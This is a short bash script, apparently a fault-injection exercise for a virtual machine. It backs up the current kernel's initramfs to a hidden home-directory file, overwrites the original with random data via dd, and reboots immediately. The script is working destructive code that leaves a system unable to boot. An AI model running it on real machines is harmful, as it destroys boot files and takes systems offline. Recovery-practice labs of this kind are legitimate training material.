#!/bin/bash
#Changing to boot directory
cd /boot

#getting current kernel initramfs name
init_name=$(ls -l /boot | awk -v initramfs="initramfs-$(uname -r)\.img" 'initramfs == $9 {print $9}')

#Making a file copy
/bin/cp $init_name ~/.$init_name

#getting current file size
init_size=$(ls -l --block-size=1k $init_name |awk '{print $5}')

#changing file information
dd if=/dev/urandom of=/boot/$init_name bs=1k count=$init_size

#Restarting the VM
init 6